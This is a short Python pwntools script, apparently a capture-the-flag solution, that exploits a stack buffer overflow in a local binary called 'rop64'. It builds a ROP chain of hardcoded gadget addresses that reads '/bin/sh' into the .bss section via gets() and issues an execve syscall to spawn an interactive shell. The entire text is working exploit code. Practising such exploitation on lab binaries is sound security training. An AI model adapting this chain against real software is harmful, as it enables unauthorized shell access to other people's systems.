from pwn import *
context.log_level = 'DEBUG'
elf = ELF("rop64")

r = process("./rop64")

pop_rax = p64(0x000000000040115e)
pop_rdi = p64(0x0000000000401160)
pop_rsi = p64(0x0000000000401162)
pop_rdx = p64(0x0000000000401164)
syscall = p64(0x0000000000401166)

bss = elf.bss()
gets = p64(0x401060)
payload = b"A"*72 + pop_rdi + p64(bss) + gets + pop_rax +  p64(59) + pop_rdi + p64(bss) + pop_rsi + p64(0) + pop_rdx + p64(0) + syscall

r.sendline(payload)
r.sendline("/bin/sh\x00")
r.interactive()
